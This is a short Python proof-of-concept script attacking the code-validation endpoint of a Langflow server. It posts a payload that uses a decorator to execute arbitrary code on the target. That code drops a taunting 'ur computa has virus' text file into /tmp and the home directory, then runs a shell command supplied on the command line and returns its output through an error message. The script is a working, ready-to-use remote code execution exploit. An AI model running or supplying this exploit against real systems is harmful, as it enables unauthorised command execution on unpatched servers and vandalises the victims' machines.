import ast
import importlib
import sys

import requests

if len(sys.argv) < 3:
    print("usage: python poc.py 'http://xxx.com:xxx' 'sleep 10'")
    exit(1)

print("this poc is tested on python3.12")

url = sys.argv[1].removesuffix("/") + "/api/v1/validate/code"

commannd_to_run = sys.argv[2]

message = """ello ur computa has virus, u didn't upgrade "Langflow" and it contains a bug and ur computer is hacked\n\ni posted a script on github so everyone can attack computers with this bug, including yours\n\ni don't know what they've done, i don't know how many they are, i just wrote the script so everyone can test this bug\n\nno thanks\n\n@puddincat07 at telegram / @PuddinCat at github"""

code_to_exec = f"""
from pathlib import Path
import os
try:
    for file in ['/tmp/ello_ur_computa_has_virus.txt', '~/ello_ur_computa_has_virus.txt']:
        Path(file).expanduser().write_text({message!r})
except:
    pass
raise Exception(os.popen({commannd_to_run!r}).read())
"""

payload = f"""
import os

@exec({code_to_exec!r})
def f():
    pass
"""

resp = requests.post(url, verify=False, json = {
    "code": payload
})

print(f"{resp.text=}")
